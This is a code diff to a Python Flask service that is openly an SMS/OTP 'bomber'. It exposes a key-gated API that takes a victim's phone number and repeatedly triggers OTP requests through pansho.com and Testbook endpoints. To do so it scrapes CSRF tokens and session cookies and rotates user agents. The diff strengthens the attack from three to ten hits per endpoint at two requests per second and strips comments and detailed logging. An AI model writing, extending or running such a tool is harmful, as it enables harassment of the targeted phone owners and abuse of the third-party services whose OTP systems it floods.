@@ -59,9 +59,8 @@ def validate_key(key):
         load_keys_from_github()
     return key in active_keys
 
-# ===== PANSHO FRESH SESSION (EVERY TIME) =====
+# ===== PANSHO FRESH SESSION =====
 def get_fresh_pansho_session():
-    """Get a completely fresh session for each request"""
     session = req_lib.Session()
     headers = {
         'User-Agent': random.choice([
@@ -82,43 +81,33 @@ def get_fresh_pansho_session():
         'Pragma': 'no-cache'
     }
     try:
-        # First, get the main page to get cookies and CSRF token
         resp = session.get('https://pansho.com/', headers=headers, timeout=15)
         soup = BeautifulSoup(resp.text, 'html.parser')
         
-        # Extract CSRF token from meta tag
         token = None
         meta = soup.find('meta', {'name': 'csrf-token'})
         if meta:
             token = meta.get('content')
-        
-        # If not found, try input field
         if not token:
             token_input = soup.find('input', {'name': '_token'})
             if token_input:
                 token = token_input.get('value')
-        
         if not token:
             token = 'DUMMY_TOKEN'
         
-        # Get cookies as dict
         cookies = session.cookies.get_dict()
-        
-        # Also get the session cookie specifically
         if '6valley1766056533_session' in session.cookies:
             cookies['6valley1766056533_session'] = session.cookies['6valley1766056533_session']
         
-        print(f"✅ Fresh Pansho session | Token: {token[:20]}... | Cookies: {len(cookies)}")
         return session, cookies, token
     except Exception as e:
         print(f"❌ Pansho session failed: {e}")
         return None, None, None
 
-# ===== SEND REQUEST WITH FRESH SESSION =====
+# ===== SEND REQUEST =====
 def send_request(req, phone):
     try:
         if 'pansho' in req['name'].lower():
-            # Get fresh session every time
             session, cookies, token = get_fresh_pansho_session()
             if not session:
                 return False
@@ -132,17 +121,12 @@ def send_request(req, phone):
             headers['Origin'] = 'https://pansho.com'
             headers['X-Requested-With'] = 'XMLHttpRequest'
             
-            # Replace placeholders
             body = req['body'].replace('{phone}', phone).replace('{token}', token)
-            
-            # Update cookies in session
             session.cookies.update(cookies)
             
-            print(f"📤 Sending Pansho OTP to {phone} with token: {token[:20]}...")
             r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=10)
             
         else:
-            # Testbook - fresh session each time
             session = req_lib.Session()
             headers = req['headers'].copy()
             headers['User-Agent'] = random.choice([
@@ -161,7 +145,6 @@ def send_request(req, phone):
             else:
                 r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=10)
         
-        # Update stats
         with stats_lock:
             stats_data['total_requests'] += 1
             if r.status_code in [200, 302, 201, 202]:
@@ -177,7 +160,7 @@ def send_request(req, phone):
             else:
                 stats_data['failed'] += 1
                 save_json(STATS_FILE, stats_data)
-                print(f"❌ {req['name']} | {r.status_code} | {phone} | {r.text[:100]}")
+                print(f"❌ {req['name']} | {r.status_code} | {phone}")
                 return False
     except Exception as e:
         with stats_lock:
@@ -187,18 +170,22 @@ def send_request(req, phone):
         print(f"❌ ERROR: {req['name']} | {phone} | {str(e)[:50]}")
         return False
 
-# ===== ONE-SHOT BOMBING =====
+# ===== ONE-SHOT BOMBING — 10x STRENGTH =====
 def one_shot_bombing(phone, key):
-    """Execute one round: 3x hits on all active requests"""
+    """Execute one round: 10x hits on all active requests with uniform speed (2 req/sec)"""
     active_requests = [r for r in requests_data if r.get('active', True)]
     
     if not active_requests:
         return {"error": "No active requests"}
     
-    # Reset stats for this round
+    # Reset stats
     global stats_data
     stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
     save_json(STATS_FILE, stats_data)
+    
+    # === NEW: 10 HITS PER REQUEST, 2 REQ/SEC ===
+    HITS_PER_REQUEST = 10
+    DELAY_BETWEEN_HITS = 0.5  # 2 req/sec per request
     
     total_hits = 0
     success_hits = 0
@@ -210,12 +197,15 @@ def one_shot_bombing(phone, key):
         target_phone = random.choice(phone_variants) if phone_variants else phone
         
         req_results = []
-        # 3 times hit
-        for hit in range(3):
+        req_success = 0
+        
+        # 10 hits per request with uniform speed
+        for hit in range(HITS_PER_REQUEST):
             success = send_request(req, target_phone)
             total_hits += 1
             if success:
                 success_hits += 1
+                req_success += 1
             
             req_results.append({
                 "hit": hit + 1,
@@ -230,17 +220,20 @@ def one_shot_bombing(phone, key):
                     "request": req['name'],
                     "phone": target_phone,
                     "status": "success" if success else "failed",
-                    "hit": hit + 1
+                    "hit": hit + 1,
+                    "total_hits": HITS_PER_REQUEST
                 }
                 logs_data.append(log_entry)
                 save_json(LOGS_FILE, logs_data[-500:])
             
-            time.sleep(0.05)  # Small delay between hits
+            # Uniform speed: 0.5 sec delay between hits (2 req/sec)
+            time.sleep(DELAY_BETWEEN_HITS)
         
         results.append({
             "request": req['name'],
             "hits": req_results,
-            "total_success": sum(1 for r in req_results if r['success'])
+            "total_success": req_success,
+            "total_hits": HITS_PER_REQUEST
         })
     
     return {
@@ -248,6 +241,8 @@ def one_shot_bombing(phone, key):
         "phone": phone,
         "key": key,
         "active_requests": len(active_requests),
+        "hits_per_request": HITS_PER_REQUEST,
+        "speed": f"{1/DELAY_BETWEEN_HITS} req/sec",
         "total_hits": total_hits,
         "success_hits": success_hits,
         "failed_hits": total_hits - success_hits,
@@ -297,7 +292,6 @@ def get_logs():
 # ===== ONE-SHOT API =====
 @app.route('/api', methods=['GET'])
 def one_shot_api():
-    """GET /api?key=KEY&bomb=PHONE -> 3x hits on all active requests -> auto-stop"""
     key = request.args.get('key')
     phone = request.args.get('bomb')
     
@@ -310,13 +304,11 @@ def one_shot_api():
     if not re.match(r'^\+?[0-9]{10,15}$', phone):
         return jsonify({"error": "Invalid phone number format"}), 400
     
-    # Execute one-shot bombing
     result = one_shot_bombing(phone, key)
     return jsonify(result)
 
 @app.route('/api/bomb/start', methods=['POST'])
 def start_bombing_post():
-    """POST version of one-shot bombing"""
     data = request.json
     phone = data.get('phone')
     if not phone:
